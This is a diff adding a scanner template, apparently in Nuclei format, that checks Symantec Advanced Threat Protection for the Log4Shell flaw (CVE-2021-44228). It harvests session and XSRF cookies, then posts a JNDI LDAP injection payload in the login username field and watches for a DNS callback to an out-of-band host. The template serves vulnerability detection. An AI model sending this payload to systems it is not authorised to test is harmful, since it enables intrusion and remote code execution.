@@ -1,0 +1,57 @@
+id: cve-2021-44228
+info:
+  name: Symantec Advanced Threat Protection log4j2 RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Symantec Advanced Threat Protection has a log4j2 remote command execution vulnerability. Attackers can exploit this to execute arbitrary commands on the server, potentially gaining complete control.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cve-id: CVE-2021-44228
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 10.0
+
+http:
+  - id: get-session-and-xsrf-tokens
+    name: Obtain session and XSRF tokens
+    method: GET
+    path:
+      - "/atpapp/"
+    matchers:
+      - type: regex
+        regex:
+          - "Set-Cookie: JSESSIONID=(.*?);"
+          - "Set-Cookie: XSRF-TOKEN=(.*?);"
+    extractors:
+      - type: regex
+        name: session_id
+        regex:
+          - "Set-Cookie: JSESSIONID=(.*?);"
+        group: 1
+        internal: true
+      - type: regex
+        name: xsrf_token
+        regex:
+          - "Set-Cookie: XSRF-TOKEN=(.*?);"
+        group: 1
+        internal: true
+
+  - id: exploit-log4j2-rce
+    name: Execute RCE payload
+    method: POST
+    path:
+      - "/atpapp/j_spring_security_check?ajax=true"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "JSESSIONID={{session_id}}; XSRF-TOKEN={{xsrf_token}}"
+      X-Xsrf-Token: "{{xsrf_token}}"
+    body: |
+      j_username=${jndi:ldap://{{interactsh-url}}}&j_password=1
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
